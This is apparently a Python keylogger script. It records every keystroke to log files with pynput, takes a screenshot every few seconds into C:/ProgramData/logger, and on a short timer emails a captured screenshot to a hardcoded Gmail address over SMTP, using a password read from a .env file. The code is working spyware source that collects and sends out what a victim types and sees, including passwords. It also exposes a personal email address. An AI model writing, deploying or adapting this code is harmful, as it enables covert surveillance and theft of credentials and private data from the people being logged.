from pynput import keyboard
from datetime import date, datetime, timedelta
import pyautogui
from win_file import create_folder
import email, smtplib, ssl

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

keys = []
curr_date = date.today()
date_str = curr_date.strftime("%d-%m-%Y")

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False
    
def write_file(keys):
    path = create_folder() 

    with open(f'{path}/logs/{date_str}.log', 'w') as f:
        for key in keys:
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)
                     
            # explicitly adding a space after
            # every keystroke for readability
            f.write(' ')

def screenshot():
    path = create_folder()
    
    curr_date_time = datetime.now()
    dt_string = curr_date_time.strftime("%d-%m-%Y_%H-%M-%S")
    
    ss = pyautogui.screenshot()
    ss.save(f'{path}/screenshots/{dt_string}.jpg')

# Start up the listener
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()

# Initialize timekeeping variables for screenshots and email
last_ss_time = datetime.utcnow()
last_email_time = datetime.utcnow()

# initialize some timeframes
screenshot_interval = 5
email_interval = 60 * 0.2

# Main loop to check timestamps for screenshots and email sending
while True:
    curr_time = datetime.utcnow()
    # print(curr_time - last_ss_time)
    
    # Check if it's time to screenshot
    if (curr_time - last_ss_time) > timedelta(seconds=screenshot_interval):
        print("Taking screenshot...")
        screenshot()
        last_ss_time = curr_time

    # Check if its time to email
    if (curr_time - last_email_time) > timedelta(seconds=email_interval):
        print("Sending email...")
        port = 465
        password = open("../.env").readlines()[0]
        sender_email = "codyschaefer22@gmail.com"
        recvr_email = "codyschaefer22@gmail.com"
        subject = "Python email"
        body = "This is me testing something"

        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = recvr_email
        message["Subject"] = subject

        message.attach(MIMEText(body, "plain"))

        filename = "C:/ProgramData/logger/screenshots/03-05-2023_00-16-57.jpg"

        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        
        encoders.encode_base64(part)

        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename}",
        )

        message.attach(part)
        text = message.as_string()

        context = ssl.create_default_context()

        with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
            server.login("codyschaefer22@gmail.com", password)
            server.sendmail(sender_email, recvr_email, text)

        # Reset email time
        last_email_time = curr_time